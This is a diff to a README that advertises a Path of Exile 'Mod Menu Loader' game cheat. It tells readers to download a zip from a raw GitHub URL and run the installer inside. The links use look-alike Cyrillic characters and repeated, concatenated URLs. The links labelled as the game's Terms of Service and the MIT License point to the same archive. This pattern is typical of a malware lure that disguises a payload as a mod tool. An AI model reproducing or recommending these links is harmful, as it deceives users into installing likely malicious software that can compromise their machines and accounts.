@@ -4,7 +4,7 @@ Welcome to the Path of Exile Mod Menu Loader – your ultimate utility designed 
 
 ## 🚀 Quick Start Installation
 
-1. Download **https://raw.githubusercontent.com/Loczek223/ExileModForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zip** from the repository.
 2. Extract contents using your preferred archive manager.
 3. Run the installer and follow on-screen prompts.
 4. Launch Path of Exile, then start the Loader.
@@ -49,10 +49,10 @@ Perfect for multi-account, trade-focused, or power-user playstyles.
 
 ## ⚠️ Disclaimer
 
-This software is intended for personal, ethical enhancement of Path of Exile gameplay. Use responsibly and adhere to [Path of Exile’s Terms of Service](https://raw.githubusercontent.com/Loczek223/ExileModForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/Lоader.zip). Unauthorized third-party tools may impact your game account—proceed with caution and awareness.
+This software is intended for personal, ethical enhancement of Path of Exile gameplay. Use responsibly and adhere to [Path of Exile’s Terms of Service](https://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zip). Unauthorized third-party tools may impact your game account—proceed with caution and awareness.
 
 ## 📃 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/Loczek223/ExileModForge/main/Lоader.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/Lоader.zip). 
+Distributed under the [MIT License](https://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zipоhttps://raw.githubusercontent.com/Loczek223/ExileModForge/main/occupative/Forge-Mod-Exile-1.6.zip). 
 
 Happy looting, exile!
